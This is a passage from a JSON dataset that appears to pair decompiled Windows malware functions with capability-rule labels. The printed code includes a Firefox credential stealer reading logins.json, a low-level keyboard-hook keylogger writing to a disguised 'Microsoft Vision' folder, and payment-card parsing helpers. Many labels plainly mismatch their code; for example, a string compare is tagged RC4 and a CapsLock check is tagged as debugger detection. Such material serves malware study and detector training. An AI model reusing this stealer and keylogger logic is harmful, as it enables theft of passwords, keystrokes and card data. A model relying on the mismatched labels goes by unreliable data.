        "decompiled_code": "\nvoid __cdecl fcn.00085c1b(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(in_ECX + 0x14);\n    iVar2 = *(in_ECX + 0x18);\n    uVar3 = uVar1 + arg_8h * 8;\n    *(in_ECX + 0x14) = uVar3;\n    if (uVar3 < uVar1) {\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = uVar1 >> 3 & 0x3f;\n    *(in_ECX + 0x18) = (arg_8h >> 0x1d) + iVar2;\n    if (uVar3 + arg_8h < 0x40) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = -uVar3 + 0x40;\n        fcn.0008102c(in_ECX + 0x1c + uVar3, in_EDX, iVar2);\n        fcn.00085ced();\n        for (uVar3 = -uVar3 + 0x7f; uVar3 < arg_8h; uVar3 = uVar3 + 0x40) {\n            fcn.00085ced();\n            iVar2 = iVar2 + 0x40;\n        }\n        uVar3 = 0;\n    }\n    fcn.0008102c(in_ECX + 0x1c + uVar3, in_EDX + iVar2, arg_8h - iVar2);\n    return;\n}\n",
        "token_count": 402
    },
    "0009023f": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0009023f(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    fcn.000856f9();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x10) = arg_10h;\n    fcn.000856f9();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x14) = arg_ch;\n    uVar1 = (arg_14h >> 3 & 0x1f) * arg_ch * arg_10h;\n    uVar2 = uVar1 >> 0x1f;\n    uVar2 = (uVar1 ^ uVar2) - uVar2;\n    if ((uVar2 & 0xf) != 0) {\n        uVar2 = (uVar2 & 0xfffffff0) + 0x10;\n    }\n    fcn.000856f9();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x18) = uVar2;\n    return;\n}\n",
        "token_count": 291
    },
    "00087fae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00087fae(uint *param_1, uint8_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint lpKeyState;\n    \n    uVar2 = param_2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    if (uVar2 < 0x5d) {\n        if (0x5a < uVar2) goto code_r0x000880a5;\n        if (0x14 < uVar2) {\n            if ((uVar2 < 0x20) || ((0x28 < uVar2 && (uVar2 != 0x2e)))) goto code_r0x00088009;\n            goto code_r0x000880a5;\n        }\n        if (uVar2 == 0x14) goto code_r0x000880a5;\n        if (uVar2 < 8) goto code_r0x00088009;\n        if ((uVar2 < 10) || (uVar2 == 0xd)) goto code_r0x000880a5;\n        if (uVar2 < 0x10) goto code_r0x00088009;\n        bVar3 = uVar2 < 0x12;\n        bVar4 = uVar2 == 0x12;\n    }\n    else {\n        if (0xb3 < uVar2) {\n            if ((uVar2 < 0xba) || ((0xc0 < uVar2 && ((uVar2 < 0xdb || (0xde < param_2)))))) goto code_r0x00088009;\n            goto code_r0x000880a5;\n        }\n        if (0xb1 < uVar2) goto code_r0x000880a5;\n        if (uVar2 < 0x60) goto code_r0x00088009;\n        if (uVar2 < 0x6a) goto code_r0x000880a5;\n        if (uVar2 < 0xad) goto code_r0x00088009;\n        bVar3 = uVar2 < 0xaf;\n        bVar4 = uVar2 == 0xaf;\n    }\n    if (!bVar3 && !bVar4) {\ncode_r0x00088009:\n        fcn.00081052(&lpKeyState, 0, 0x100);\n        uVar1 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar2, 0);\n        (*_sym.imp.USER32.dll_ToUnicode)(uVar2, uVar1, &lpKeyState, param_1 + 2, 1, 0);\n        return param_1;\n    }\ncode_r0x000880a5:\n    param_1[1] = uVar2;\n    return param_1;\n}\n",
        "token_count": 662
    },
    "0008795b": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.0008795b(void)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetKeyState)(0x14);\n    return uVar1 & 1;\n}\n",
        "token_count": 53
    },
    "0008e27e": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0008e27e(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t extraout_DL;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = fcn.0008e1ec();\n    uVar2 = uVar1;\n    uVar3 = extraout_DL;\n    if (uVar1 != 0) {\n        uVar2 = fcn.0008e176(5, &var_4h);\n        if ((uVar2 == 0) || (iVar4 = var_4h,  var_4h == 0)) {\n            uVar3 = ~*(uVar1 + 0x16) & 1;\n        }\n        else {\n            do {\n                iVar4 = iVar4 - *(uVar2 + 4);\n                uVar2 = fcn.0008dfc8(uVar2 + 8, arg_8h, arg_ch);\n                if (uVar2 == 0) break;\n            } while (iVar4 != 0);\n            uVar3 = 1;\n        }\n    }\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 298
    },
    "00089722": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00089722(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *arg_8h_00;\n    uint pszPath;\n    uint32_t uVar9;\n    uint var_4c4h;\n    uint lpApplicationName;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t lpBinaryType;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpExistingFileName;\n    uint lpNewFileName;\n    uint var_8h;\n    \n    var_1ch = in_ECX;\n    fcn.000833ab(L\"Profile\");\n    uVar4 = 0;\n    fcn.00081052(&var_4c4h, 0, 0x208);\n    var_5ch = 0;\n    lpBinaryType = 0;\n    fcn.00081052(&lpApplicationName, 0, 0x104);\n    fcn.0008abe2();\n    fcn.000833ab(&lpApplicationName);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpApplicationName, L\"\\\\firefox.exe\");\n    (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)(&lpApplicationName, &lpBinaryType);\n    arg_8h_00 = &var_28h;\n    uVar9 = lpBinaryType == 6;\n    pszPath = extraout_ECX;\n    fcn.000833f3(arg_8h_00);\n    iVar1 = fcn.0008a50c(arg_8h_00, pszPath);\n    if (iVar1 != 0) {\n        fcn.00083230(L\"\\\\Mozilla\\\\Firefox\\\\\");\n        fcn.000833f3(&arg_8h);\n        fcn.00083230(L\"profiles.ini\");\n        uVar4 = fcn.000833ab(L\"Profile\");\n        fcn.000831fd(uVar4);\n        fcn.000858fb();\n        fcn.00083038(0);\n        while (iVar1 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(var_14h, L\"Path\", 0, &var_4c4h, 0x104, var_20h)\n              ,  iVar1 != 0) {\n            iVar1 = var_5ch + 1;\n            var_5ch = iVar1;\n            uVar4 = fcn.000833ab(L\"Profile\");\n            fcn.000831fd(uVar4);\n            fcn.000858fb();\n            var_34h = 0;\n            fcn.00083038(iVar1);\n            fcn.000833f3(&arg_8h);\n            fcn.00083230(&var_4c4h);\n            fcn.0008331a(&var_18h);\n            iVar1 = (**(in_ECX + 0x60))(var_18h);\n            if (((iVar1 == 0) && (var_98h = (**(in_ECX + 0x78))(),  var_98h != 0)) &&\n               (iVar1 = (**(in_ECX + 0x74))(var_98h, 1, 0),  iVar1 == 0)) {\n                fcn.000833f3(&var_8h);\n                fcn.00083230(L\"\\\\logins.json\");\n                fcn.0008d51c();\n                fcn.00083230(0x92464);\n                uVar4 = fcn.0008326d();\n                fcn.000830fb(uVar4);\n                fcn.000858fb();\n                var_38h = 0;\n                fcn.00083230(L\".tmp\");\n                uVar4 = lpNewFileName;\n                iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, lpNewFileName, 0);\n                if (iVar1 != 0) {\n                    fcn.000831fd(&lpNewFileName);\n                }\n                fcn.0008d9f6();\n                fcn.000831fd(&lpExistingFileName);\n                uVar7 = 0xc0000000;\n                uVar8 = extraout_ECX_00;\n                iVar1 = fcn.0008dcba(0xc0000000);\n                if (iVar1 != 0) {\n                    var_30h = 0;\n                    var_2ch = 0;\n                    fcn.0008d965(&var_30h, var_a0h, 0);\n                    fcn.00083185(\"encryptedUsername\");\n                    fcn.00082cf2(&var_9ch);\n                    iVar2 = fcn.000889d8();\n                    var_74h = iVar2;\n                    fcn.000858fb();\n                    fcn.000858fb();\n                    iVar1 = var_74h;\n                    while (iVar2 != 0) {\n                        pcVar6 = \"hostname\";\n                        var_6ch = 0;\n                        var_68h = 0;\n                        var_64h = 0;\n                        iVar2 = iVar1;\n                        uVar4 = fcn.00083185(\"hostname\");\n                        puVar5 = &var_78h;\n                        fcn.00082cf2(puVar5);\n                        fcn.00088a11(puVar5, uVar4);\n                        fcn.000858fb(pcVar6, iVar2);\n                        fcn.000858fb();\n                        pcVar6 = \"encryptedUsername\";\n                        iVar2 = iVar1;\n                        uVar4 = fcn.00083185(\"encryptedUsername\");\n                        puVar5 = &var_80h;\n                        fcn.00082cf2(puVar5);\n                        fcn.00088a11(puVar5, uVar4);\n                        fcn.000858fb(pcVar6, iVar2);\n                        fcn.000858fb();\n                        pcVar6 = \"encryptedPassword\";\n                        iVar2 = iVar1;\n                        uVar4 = fcn.00083185(\"encryptedPassword\");\n                        puVar5 = &var_88h;\n                        fcn.00082cf2(puVar5);\n                        fcn.00088a11(puVar5, uVar4);\n                        fcn.000858fb(pcVar6, iVar2);\n                        fcn.000858fb();\n                        fcn.00089c70(var_54h, &var_48h);\n                        fcn.00089c70(var_50h, &var_4ch);\n                        uVar4 = fcn.00082e63(&var_3ch);\n                        fcn.000831fd(uVar4);\n                        fcn.000858fb();\n                        puVar5 = &var_40h;\n                        var_3ch = 0;\n                        uVar4 = var_48h;\n                        fcn.00083185(var_48h);\n                        uVar3 = fcn.00082e63(uVar4);\n                        fcn.000831fd(uVar3);\n                        fcn.000858fb(uVar3, uVar4, puVar5);\n                        var_40h = 0;\n                        fcn.000858fb();\n                        puVar5 = &var_44h;\n                        uVar4 = var_4ch;\n                        fcn.00083185(var_4ch);\n                        uVar3 = fcn.00082e63(uVar4);\n                        fcn.000831fd(uVar3);\n                        fcn.000858fb(uVar3, uVar4, puVar5);\n                        var_44h = 0;\n                        fcn.000858fb();\n                        var_60h = 0;\n                        puVar5 = &var_6ch;\n                        fcn.00081ed8(puVar5);\n                        fcn.00081f0e(puVar5);\n                        fcn.000858fb();\n                        fcn.000858fb();\n                        fcn.000858fb();\n                        fcn.000858fb();\n                        fcn.000858fb();\n                        fcn.0008138f();\n                        iVar1 = iVar1 + -1;\n                        uVar4 = lpNewFileName;\n                        iVar2 = iVar1;\n                    }\n                    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(uVar4);\n                    if (iVar1 != 0) {\n                        puVar5 = &lpNewFileName;\n                        fcn.000833f3(puVar5);\n                        fcn.0008da33(puVar5);\n                    }\n                    (**(var_1ch + 0x7c))(var_98h);\n                    (**(var_1ch + 100))();\n                    fcn.00082dff();\n                }\n                fcn.0008da15(uVar7, uVar8);\n                fcn.000858fb();\n                lpNewFileName = 0;\n                fcn.000858fb();\n                lpExistingFileName = 0;\n                fcn.000858fb();\n                fcn.000858fb();\n                in_ECX = var_1ch;\n            }\n            else {\n                fcn.000858fb();\n                fcn.000858fb();\n            }\n            var_8h = 0;\n        }\n        fcn.0008a4b5();\n        uVar4 = 1;\n        fcn.000858fb();\n    }\n    fcn.000858fb(arg_8h_00, pszPath, uVar9);\n    fcn.000858fb();\n    fcn.000858fb();\n    return uVar4;\n}\n",
        "token_count": 2381
    },
    "0008d01d": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.0008d01d(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    pcVar1 = _sym.imp.WS2_32.dll_send;\n    iVar2 = (*_sym.imp.WS2_32.dll_send)(param_1, &var_1h, 1, 0);\n    if ((0 < iVar2) && (iVar2 = (*pcVar1)(param_1, &var_1h, 1, 0),  0 < iVar2)) {\n        iVar2 = 0;\n        while (iVar3 = (*pcVar1)(param_1, &var_1h, 1, 0),  0 < iVar3) {\n            iVar2 = iVar2 + 1;\n            if (5 < iVar2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 231
    },
    "0008c993": {
        "rules": [
            "parse credit card information/4eef9ae1278b42f592aee8ead6d8bf37"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __fastcall fcn.0008c993(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint *arg_8h;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t lpNumberOfBytesRead;\n    int32_t nNumberOfBytesToRead;\n    \n    while( true ) {\n        nNumberOfBytesToRead = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_PeekNamedPipe)(param_1[2], 0, 0, 0, &fcn.0008c993::nNumberOfBytesToRead, 0);\n        if (iVar2 == 0) break;\n        if (nNumberOfBytesToRead == 0) {\n            return 1;\n        }\n        var_ch = 0x8c9b5;\n        iVar2 = fcn.000859a9();\n        lpNumberOfBytesRead = 0;\n        var_ch = 0;\n        var_10h = &fcn.0008c993::lpNumberOfBytesRead;\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(param_1[2], iVar2, nNumberOfBytesToRead);\n        if (iVar1 == 0) break;\n        *(lpNumberOfBytesRead + iVar2) = 0;\n        var_ch = lpNumberOfBytesRead;\n        var_10h = iVar2;\n        fcn.00082d5a(iVar2, lpNumberOfBytesRead);\n        fcn.00082ca1(&fcn.0008c993::var_10h);\n        fcn.00082cf2(&fcn.0008c993::var_ch);\n        fcn.00082e52();\n        arg_8h = &fcn.0008c993::var_ch;\n        uVar3 = extraout_ECX;\n        fcn.000831bb(arg_8h);\n        (**(*param_1 + 4))(arg_8h, uVar3);\n        fcn.000858fb();\n        fcn.000858fb();\n        var_10h = NULL;\n        fcn.00082dff();\n    }\n    var_ch = 0x8ca62;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar2 == 0x6d) || (iVar2 == 0xe8)) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 635
    },
    "0008f373": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008f373(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    do {\n        uVar1 = fcn.0008f39d(arg_8h);\n        *(arg_8h + param_1) = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"[uVar1 % 0x3e];\n        arg_8h = arg_8h + 1;\n    } while (arg_8h < 10);\n    *(param_1 + 10) = 0;\n    return;\n}\n",
        "token_count": 140
    },
    "000810e6": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t fcn.000810e6(uint8_t *param_1, uint8_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = *param_1 - *param_2;\n        if ((iVar1 != 0) || (*param_2 == 0)) break;\n        param_1 = param_1 + 1;\n        param_2 = param_2 + 1;\n    }\n    if (iVar1 < 0) {\n        return -1;\n    }\n    if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 143
    },
    "00087376": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "get common file path",
            "set application hook",
            "log keystrokes via application hook"
        ],
        "decompiled_code": "\nuint fcn.00087376(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_d4h;\n    uint var_30h;\n    uint32_t var_14h;\n    uint32_t uStack20;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    var_14h = 0;\n    uStack20 = 0;\n    var_ch = 0;\n    var_8h = 0;\n    fcn.00081052(*0x966ac + 0x210, 0, 0x800);\n    fcn.00081052(*0x966ac + 0x10, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, *0x966ac + 0x10);\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x966ac + 0x10, L\"\\\\Microsoft Vision\\\\\");\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)(&var_14h);\n    (*_sym.imp.USER32.dll_wsprintfW)\n              (&var_d4h, L\"%02d-%02d-%02d_%02d.%02d.%02d\", uStack20 >> 0x10, var_14h >> 0x10, var_14h & 0xffff, \n               var_ch & 0xffff, var_ch >> 0x10, var_8h & 0xffff);\n    (*pcVar1)(*0x966ac + 0x10, &var_d4h);\n    fcn.000830c5(*0x966ac + 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(*0x966ac + 0xc), 0x10000000, 1, 0, 2, 0x80, 0);\n    *(*0x966ac + 4) = uVar3;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xd, fcn.000874c0, uVar2, 0);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    while( true ) {\n        iVar4 = (*pcVar1)(&var_30h, 0, 0, 0);\n        if (iVar4 < 1) break;\n        (*_sym.imp.USER32.dll_TranslateMessage)(&var_30h);\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&var_30h);\n    }\n    return 0;\n}\n",
        "token_count": 645
    },
    "00081130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00081130(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 166
    },
    "000813d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000813d3(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.000859a9();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 4;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar1 + *in_ECX;\n                fcn.000831fd(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-1] = *(arg_8h_00 + 4);\n                *piVar1 = *(arg_8h_00 + 8);\n                piVar1[1] = *(arg_8h_00 + 0xc);\n                piVar1 = piVar1 + 4;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00081a48();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.000831fd(&arg_8h);\n    var_8h[piVar1 * 4 + 1] = arg_ch;\n    var_8h[piVar1 * 4 + 2] = arg_10h;\n    var_8h[piVar1 * 4 + 3] = arg_14h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 633
    },
    "000814d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.000814d4(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.000859a9();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 185
    },
    "00081521": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00081521(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.000856f9();\n    arg_8h_00 = arg_ch * 0x10 + *in_ECX;\n    fcn.000833f3(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = *(arg_8h_00 + 0xc);\n    return arg_8h;\n}\n",
        "token_count": 169
    },
    "00081683": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00081683(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar1 = fcn.000859a9();\n    if (piVar1 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar1 = piVar3;\n        piVar2 = piVar1 + 1;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 188
    },
    "000816d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.000816d5(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint *puVar1;\n    \n    fcn.000856f9();\n    puVar1 = arg_ch * 0xc + *in_ECX;\n    *arg_8h = *puVar1;\n    fcn.000833f3(puVar1 + 1);\n    fcn.000833f3(puVar1 + 2);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "00081716": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081716(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.000859a9();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 6;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 4;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-0x10 - var_8h) + piVar1 + *in_ECX;\n                fcn.000831fd(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-2] = *(arg_8h_00 + 8);\n                piVar1[-1] = *(arg_8h_00 + 0xc);\n                *piVar1 = *(arg_8h_00 + 0x10);\n                piVar1 = piVar1 + 6;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00081a75();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.000831fd(&arg_8h);\n    var_8h[piVar1 * 6 + 2] = arg_10h;\n    var_8h[piVar1 * 6 + 3] = arg_14h;\n    var_8h[piVar1 * 6 + 4] = arg_18h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 646
    },
    "00081815": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00081815(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.000859a9();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 6;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 184
    },
    "00081862": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00081862(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.000856f9();\n    arg_8h_00 = arg_ch * 0x18 + *in_ECX;\n    fcn.000833f3(arg_8h_00);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = *(arg_8h_00 + 0xc);\n    *(arg_8h + 0x10) = *(arg_8h_00 + 0x10);\n    return arg_8h;\n}\n",
        "token_count": 173
    },
    "000818a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
